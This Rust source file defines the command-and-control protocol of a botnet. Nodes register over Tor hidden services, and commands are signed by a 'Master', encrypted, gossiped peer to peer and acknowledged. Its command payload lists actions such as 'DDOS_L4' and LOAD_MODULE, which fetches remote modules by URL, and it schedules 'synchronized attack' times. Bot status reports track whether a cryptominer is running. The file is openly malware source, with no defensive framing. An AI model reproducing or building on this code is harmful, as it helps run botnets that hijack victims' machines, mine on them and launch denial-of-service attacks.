use serde::{Deserialize, Serialize};
use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, AeadCore, KeyInit};
use chacha20poly1305::aead::{Aead, OsRng};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

/// The Signaling Protocol for the Relay
/// The Mesh Networking Protocol (Over Tor Hidden Services)
#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(tag = "type", content = "payload")]
pub enum MeshMsg {
    /// Node -> Bootstrap: "Here is my .onion Address"
    Register(Registration),
    /// Node -> Bootstrap: "Give me peers"
    GetPeers,
    /// Bootstrap -> Node: "Here are some peers"
    Peers(Vec<PeerInfo>),
    
    /// Handshake Step 1: Initiator sends Ephemeral PubKey
    ClientHello { ephemeral_pub: String },
    /// Handshake Step 2: Responder sends Ephemeral PubKey
    ServerHello { ephemeral_pub: String },
    
    /// Node <-> Node / Ghost -> Node: "Broadcast this command"
    Gossip(GossipMsg),
    
    /// Node -> Node: "Do you know this bot?"
    FindBot { target_id: String },
    /// Node -> Node: "Yes, I know these closest nodes"
    FoundBot { nodes: Vec<PeerInfo> },
    
    /// Bot -> Master: "Command Executed"
    Ack(AckPayload),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Registration {
    pub pub_key: String, // Hex
    pub onion_address: String,
    pub signature: String, // Signs "Register:<onion_address>" to prove ownership of Key
    pub pow_nonce: u64,    // Proof of Work to prevent Sybil Attacks
    pub timestamp: i64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PeerInfo {
    pub pub_key: String,
    pub onion_address: String,
    pub last_seen: i64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GossipMsg {
    pub id: String, // UUIDv4
    pub packet: GhostPacket, // The Encrypted Command
    pub ttl: u8, // Time To Live (max hops)
}

/// The Authenticated "Ghost Packet" (Signed by Master)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GhostPacket {
    pub ciphertext: String, // Base64 Encrypted JSON
    pub nonce: String,      // Base64 Nonce
    pub signature: String,  // Hex Signature of PLAINTEXT JSON
}

/// The Actual Command Content (Inside GhostPacket)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CommandPayload {
    pub id: String,         // UUIDv4
    pub action: String,     // "DDOS_L4", "LOAD_MODULE", "START_MODULE", "STOP_MODULE"
    pub parameters: String, // Pipe-separated params
                            // LOAD_MODULE:  "url|name|sha256"
                            // START_MODULE: "name|args"
                            // STOP_MODULE:  "name"
    pub execute_at: i64,    // Unix Timestamp for synchronized attack
    pub reply_to: Option<String>, // Optional: Master's Onion for Ack
}

/// Bot Status Report (Heartbeat) - NOT YET SIGNED in this version, just informational
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BotStatus {
    pub id: String,
    pub hostname: String,
    pub os: String,
    pub version: String,
    pub miner_running: bool,
    pub mesh_health: f32,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AckPayload {
    pub command_id: String,
    pub status: String, // "Executed", "Failed"
    pub details: String,
}

impl GhostPacket {
    pub fn new(cmd: &CommandPayload, key: &[u8], sign_fn: impl Fn(&[u8]) -> String) -> Self {
        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits; unique per message
        
        let json = serde_json::to_string(cmd).unwrap();
        let ciphertext = cipher.encrypt(&nonce, json.as_bytes()).expect("Encryption Failed");
        
        // Encode
        let cipher_b64 = BASE64.encode(ciphertext);
        let nonce_b64 = BASE64.encode(nonce);
        
        // Sign the PLAINTEXT JSON (Allows Re-Encryption by Relay without breaking Sig)
        let signature = sign_fn(json.as_bytes());

        GhostPacket {
            ciphertext: cipher_b64,
            nonce: nonce_b64,
            signature,
        }
    }

    pub fn decrypt(&self, key: &[u8]) -> Option<CommandPayload> {
        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
        
        let nonce_bytes = BASE64.decode(&self.nonce).ok()?;
        let cipher_bytes = BASE64.decode(&self.ciphertext).ok()?;
        
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let plaintext = cipher.decrypt(nonce, cipher_bytes.as_ref()).ok()?;
        let json = String::from_utf8(plaintext).ok()?;
        
        serde_json::from_str(&json).ok()
    }
}

use ed25519_dalek::{Verifier, VerifyingKey, Signature};

/// Helper to verify Ed25519 Signatures (Hex encoded)
pub fn verify_signature(pub_hex: &str, data: &[u8], sig_hex: &str) -> bool {
    let pub_bytes = match hex::decode(pub_hex) {
        Ok(b) => b,
        Err(_) => return false,
    };
    // VerifyingKey::from_bytes returns Result
    let pub_key = match pub_bytes.try_into() {
        Ok(arr) => match VerifyingKey::from_bytes(&arr) {
            Ok(k) => k,
            Err(_) => return false,
        },
        Err(_) => return false,
    };

    let sig_bytes = match hex::decode(sig_hex) {
        Ok(b) => b,
        Err(_) => return false,
    };
    
    let sig_arr: [u8; 64] = match sig_bytes.try_into() {
        Ok(a) => a,
        Err(_) => return false,
    };
    
    let signature = Signature::from_bytes(&sig_arr);

    pub_key.verify(data, &signature).is_ok()
}
